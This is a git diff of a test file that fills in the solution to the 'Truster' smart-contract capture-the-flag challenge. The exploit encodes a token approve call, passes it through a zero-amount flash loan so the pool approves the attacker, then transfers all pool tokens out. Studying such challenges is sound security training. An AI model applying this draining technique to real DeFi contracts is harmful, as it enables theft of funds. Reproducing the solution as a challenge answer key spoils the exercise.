@@ -30,14 +30,19 @@ describe('[Challenge] Truster', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
         
-        // let data = await this.pool.encode(attacker.address)
+        /**
+         * The pool allows you to call any address with arbitrary data. 
+         * This means that you can call any contract and any function.
+         */
+        // Create call data for a token approve function
         let ABI = [ "function approve(address to, uint256 amount)" ];
         let iface = new ethers.utils.Interface(ABI);
+        // include the attacker address and the amount of tokens in the pool
         let data = iface.encodeFunctionData("approve", [ attacker.address, TOKENS_IN_POOL ])
-        // let data = iface.encodeFunctionData("approve", TOKENS_IN_POOL)
+        // Call a 0 flash loan, but send an approve tx via the pool to let the attacker to spend pool tokens
         await this.pool.flashLoan(0, attacker.address, this.token.address, data)
-        
-        // console.log(await this.token.allowance(this.pool.address, attacker.address))
+
+        // Transfer the pool tokens as the attacker
         await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
 
     });
